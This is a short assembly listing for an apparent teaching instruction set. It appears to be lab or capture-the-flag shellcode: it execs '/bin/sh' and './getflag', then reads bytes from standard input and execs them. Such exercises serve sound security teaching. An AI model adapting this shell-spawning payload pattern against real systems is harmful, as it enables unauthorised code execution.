ld $7, r1
gpc $28, r0
sys $2
ld $0, r0   # r0 = fd = 0 (standard in)
gpc $16, r1 # r1 = buf
ld $64, r2  # r2 = size
sys $0      # system call: read
mov r0, r1  # r1 = size = read return value
gpc $4, r0 # r0 = buf
sys $2      # system call: exec
.long 0x2f62696e
.long 0x2f736800
.long 0x2e2f6765
.long 0x74666c61
.long 0x67000000
.long 0
.long 0
.long 0
.long 0
.long 0
.long 0
.long 0
.long 0
.long 0
.long 0
.long 0
